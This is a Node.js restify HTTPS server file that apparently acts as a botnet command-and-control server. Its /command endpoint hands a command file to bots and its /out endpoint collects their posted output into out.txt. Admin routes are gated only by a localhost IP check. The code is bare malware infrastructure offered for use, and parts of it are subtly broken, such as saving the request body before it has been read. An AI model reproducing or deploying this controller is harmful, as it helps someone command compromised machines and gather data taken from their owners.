var restify = require('restify');
var userSave = require('save')('user');

var ADMIN_HOST = '127.0.0.1';
var fs = require('fs');
var https = require('https');

var PORT = 443;

var server = restify.createServer({
  certificate: fs.readFileSync('server.crt'),
  key: fs.readFileSync('server.key'),
});

//server.use(restify.bodyParser());

function checkIP (req) {
  return ADMIN_HOST === req.connection.remoteAddress;
}

var connectionInitialized = function(req, res) {
  var date = new Date();  
  console.log("Connection Recieved:", date, res.connection.remoteAddress,
              req.url, req.headers['user-agent']);
};

// Admin Controller
server.get('/admin', function(req, res) {
  connectionInitialized(req, res);
  if (checkIP(req)) {
    var html = fs.readFileSync('./admin/index.html', 'utf-8');
    res.writeHead(200, {
      'Content-Length': Buffer.byteLength(html),
      'Content-Type': 'text/html'
    });
    res.write(html);
    res.end();
  } else {
    res.send("Unauthorized"); 
  }
});


// Cmd Update
server.post('/cmdUpdate', function(req, res) {
  connectionInitialized(req, res);
  if (checkIP(req)) {
    //console.log(req.body, req.params);
  }else {
   // res.write("Unauthorized"); 
  }
  res.writeHead(200, { 'Content-Type': 'text/html' });
  res.end('ok', 'utf-8');
});

// Bot Command
server.get('/command', function(req, res) {
  connectionInitialized(req, res);
  fs.readFile('./admin/command', function(err, content) {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(content, 'utf-8');
  });
});

// Post of Bot Output
server.post('/out', function(req, res) {
  connectionInitialized(req, res);
  var body = "";
    req.on('data', function (chunk) {
    body += chunk;
  });
  //Write post to file
  fs.createWriteStream("out.txt").once('open', function() {
    this.write(body);
    this.end();
  });
  //Return 200
  res.writeHead(200, { 'Content-Type': 'text/html' });
  res.end('ok', 'utf-8');
});

server.listen(PORT, function() {
  console.log("Listening on port "+PORT+"....");
});
